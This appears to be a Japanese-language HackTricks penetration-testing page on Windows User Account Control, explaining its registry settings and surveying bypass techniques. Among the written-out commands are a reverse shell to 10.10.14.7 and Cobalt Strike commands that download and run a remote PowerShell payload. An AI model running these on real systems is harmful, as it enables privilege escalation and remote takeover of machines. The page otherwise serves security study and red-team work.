# UAC - User Account Control

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化**します。
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格した活動に対する同意プロンプトを有効にする**機能です。アプリケーションには異なる`integrity`レベルがあり、**高レベル**のプログラムは**システムを危険にさらす可能性のあるタスク**を実行できます。UACが有効な場合、アプリケーションとタスクは、管理者が明示的にこれらのアプリケーション/タスクにシステムへの管理者レベルのアクセスを許可するまで、常に**非管理者アカウントのセキュリティコンテキストの下で実行されます**。これは、意図しない変更から管理者を保護する便利な機能ですが、セキュリティ境界とは見なされません。

integrityレベルについての詳細はこちら：

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UACが設置されている場合、管理者ユーザーには2つのトークンが与えられます：通常のアクションを通常レベルで実行するための標準ユーザーキーと、管理者権限を持つものです。

この[ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、UACの動作について詳しく説明しており、ログオンプロセス、ユーザーエクスペリエンス、およびUACアーキテクチャが含まれています。管理者は、ローカルレベルでのセキュリティポリシー（secpol.mscを使用）を使用して、またはActive Directoryドメイン環境でGroup Policy Objects（GPO）を介して設定および展開することによって、組織に特有のUACの動作を構成できます。さまざまな設定については[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UACには設定できる10のGroup Policy設定があります。以下の表に詳細を示します：

| Group Policy設定                                                                                                                                                                                                                                                                                                                                                           | レジストリキー                | デフォルト設定                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 組み込みAdministratorアカウントのAdmin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 無効                                                     |
| [User Account Control: UIAccessアプリケーションがセキュアデスクトップを使用せずに昇格を促すことを許可する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 無効                                                     |
| [User Account Control: Admin Approval Modeの管理者に対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を求める                  |
| [User Account Control: 標準ユーザーに対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | セキュアデスクトップで資格情報を求める                 |
| [User Account Control: アプリケーションのインストールを検出し、昇格を促す](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 有効（ホームのデフォルト）無効（企業のデフォルト） |
| [User Account Control: 署名され検証された実行可能ファイルのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 無効                                                     |
| [User Account Control: セキュアな場所にインストールされたUIAccessアプリケーションのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 有効                                                      |
| [User Account Control: すべての管理者をAdmin Approval Modeで実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 有効                                                      |
| [User Account Control: 昇格を促す際にセキュアデスクトップに切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 有効                                                      |
| [User Account Control: ユーザーごとの場所へのファイルおよびレジストリ書き込み失敗を仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 有効                                                      |

### UAC Bypass理論

**管理者グループに属するユーザー**の場合、一部のプログラムは_**Manifests**_内の_**autoElevate**_オプションが_**True**_として設定されているため、**自動的に自動昇格**されます。バイナリは**Microsoftによって署名**されている必要があります。

その後、攻撃者はこの種のバイナリを使用して**任意のコードを実行**することで**UAC**を**バイパス**します（**中**レベルのintegrityから**高**レベルに昇格）。これは、**High level integrityプロセス**から実行されるためです。

バイナリの_**Manifest**_をチェックするには、Sysinternalsのツール_**sigcheck.exe**_を使用できます。また、プロセスの**integrityレベル**を見るには、_Process Explorer_または_Process Monitor_（Sysinternalsのもの）を使用できます。

### UACの確認

UACが有効かどうかを確認するには：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
**`1`** であればUACは**アクティブ**です。**`0`** であるか、存在しない場合は、UACは**非アクティブ**です。

次に、**どのレベル**が設定されているかを確認します：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* **`0`** の場合、UACはプロンプトを表示しません（**無効**のように）
* **`1`** の場合、管理者は高権限でバイナリを実行するために**ユーザー名とパスワードを求められます**（セキュアデスクトップ上で）
* **`2`**（**常に通知する**）の場合、管理者が高権限で何かを実行しようとすると、UACは常に確認を求めます（セキュアデスクトップ上で）
* **`3`** の場合、`1`と同じですが、セキュアデスクトップ上での実行は必要ありません
* **`4`** の場合、`2`と同じですが、セキュアデスクトップ上での実行は必要ありません
* **`5`**（**デフォルト**）の場合、管理者はWindows以外のバイナリを高権限で実行する前に確認を求められます

次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります。\
値が **`0`** の場合、**RID 500** ユーザー（**組み込みの管理者**）のみがUACなしで**管理タスクを実行できます**。値が `1` の場合、**"Administrators"** グループ内の**全アカウント**がそれらを実行できます。

最後に、キー **`FilterAdministratorToken`** の値を確認してください。\
**`0`**（デフォルト）の場合、**組み込みの管理者アカウント**はリモート管理タスクを実行でき、**`1`** の場合、組み込みの管理者アカウントは `LocalAccountTokenFilterPolicy` が `1` に設定されていない限り、リモート管理タスクを**実行できません**。

#### 要約

* `EnableLUA=0` または **存在しない場合**、**誰にもUACはありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1` の場合、誰にもUACはありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0` かつ `FilterAdministratorToken=0` の場合、RID 500（組み込みの管理者）にはUACはありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0` かつ `FilterAdministratorToken=1` の場合、全員にUACがあります**

この情報は全て **metasploit** モジュール：`post/windows/gather/win_privs` を使用して収集できます。

また、ユーザーのグループを確認し、整合性レベルを取得することもできます：
```
net user %username%
whoami /groups | findstr Level
```
## UACバイパス

{% hint style="info" %}
グラフィカルアクセスが被害者にある場合、UACバイパスは簡単です。UASプロンプトが表示されたときに「はい」をクリックするだけです。
{% endhint %}

UACバイパスが必要な状況は次のとおりです：**UACが有効で、プロセスが中間整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。

UACが最高セキュリティレベル（Always）にある場合は、他のレベル（Default）にある場合よりもバイパスが**はるかに困難である**ということを言及することが重要です。

### UAC無効

UACが既に無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、次のようなものを使用して**管理者権限でリバースシェルを実行**できます（高整合性レベル）：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### トークン複製によるUACバイパス

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に** 基本的なUAC "バイパス"（完全なファイルシステムアクセス）

管理者グループに属するユーザーのシェルを持っている場合、SMB（ファイルシステム）経由でC$を**マウント**し、新しいディスクにローカルでマウントすると、ファイルシステム内の**すべてにアクセス**できます（管理者のホームフォルダーでさえも）。

{% hint style="warning" %}
**このトリックはもう機能しないようです**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strikeを使用したUACバイパス

Cobalt Strikeの技術は、UACが最大のセキュリティレベルに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**と**Metasploit**には、**UAC**を**バイパス**するためのいくつかのモジュールがあります。

### KRBUACBypass

ドキュメントとツールは[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)にあります。

### UAC バイパスのエクスプロイト

[**UACME**](https://github.com/hfiref0x/UACME)は、いくつかのUACバイパスのエクスプロイトを**コンパイル**したものです。**Visual Studioまたはmsbuildを使用してUACMEをコンパイルする必要があります**。コンパイルにより、いくつかの実行可能ファイル（例：`Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されますが、**どれを必要とするかを知る必要があります。**\
**注意が必要です**。なぜなら、いくつかのバイパスは**他のプログラムのプロンプトを表示させる**ことがあり、それによって**ユーザー**に何かが起こっていることを**警告**する可能性があるからです。

UACMEには、各テクニックが機能し始めた**ビルドバージョン**があります。あなたのバージョンに影響を与えるテクニックを検索できます：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
以下は、Windowsのリリース`1607`をビルドバージョンから取得するために使用する[この](https://en.wikipedia.org/wiki/Windows_10_version_history)ページです。

#### より多くのUACバイパス

**すべての**ここで使用されるUACバイパス技術は、被害者との**完全なインタラクティブシェル**を**必要とします**（一般的なnc.exeシェルでは不十分です）。

**meterpreter**セッションを使用して取得できます。**Session**値が**1**に等しい**プロセス**に移行します：

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_が機能するはずです)

### GUIを使用したUACバイパス

**GUIにアクセスできる場合は、UACプロンプトが表示されたときにそれを受け入れるだけでよく、本当にバイパスする必要はありません。**したがって、GUIへのアクセスを取得することで、UACをバイパスできます。

さらに、誰かが使用していた（おそらくRDP経由で）GUIセッションを取得すると、**管理者として実行されているツールがいくつかあり**、UACに再度プロンプトされることなく、たとえば**管理者として直接cmdを実行**できるようになります。[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)のようなものです。これは少し**ステルス**かもしれません。

### 騒々しいブルートフォースUACバイパス

騒がしいことを気にしない場合は、ユーザーがそれを受け入れるまで権限の昇格を求め続ける[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)のようなものを**実行する**ことができます。

### 独自のバイパス - 基本的なUACバイパス方法論

**UACME**を見ると、**ほとんどのUACバイパスがDllハイジャックの脆弱性を悪用している**ことがわかります（主に_C:\Windows\System32_に悪意のあるdllを書き込むことによって）。[Dllハイジャックの脆弱性を見つける方法を学ぶには、これを読んでください](../windows-local-privilege-escalation/dll-hijacking.md)。

1. **自動昇格**するバイナリを見つけます（実行されると高い完全性レベルで実行されることを確認します）。
2. procmonを使用して、**DLLハイジャック**に対して脆弱な可能性のある "**NAME NOT FOUND**" イベントを見つけます。
3. 書き込み権限のない保護されたパス（C:\Windows\System32など）にDLLを**書き込む**必要があるかもしれません。これをバイパスするには：
   1. **wusa.exe**：Windows 7,8および8.1。保護されたパス内にCABファイルの内容を抽出することを許可します（このツールは高い完全性レベルから実行されるため）。
   2. **IFileOperation**：Windows 10。
4. 保護されたパスにDLLをコピーして、脆弱で自動昇格されたバイナリを実行する**スクリプト**を準備します。

### 別のUACバイパス技術

**自動昇格されたバイナリ**が**レジストリ**から実行される**バイナリ**または**コマンド**の**名前/パス**を**読み取ろうとする**かどうかを監視することによって成り立っています（バイナリがこの情報を**HKCU**内で検索する場合、これはより興味深いです）。

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

世界で**最も進んだ**コミュニティツールを搭載したワークフローを簡単に構築して**自動化する**ために[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks)を使用します。
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
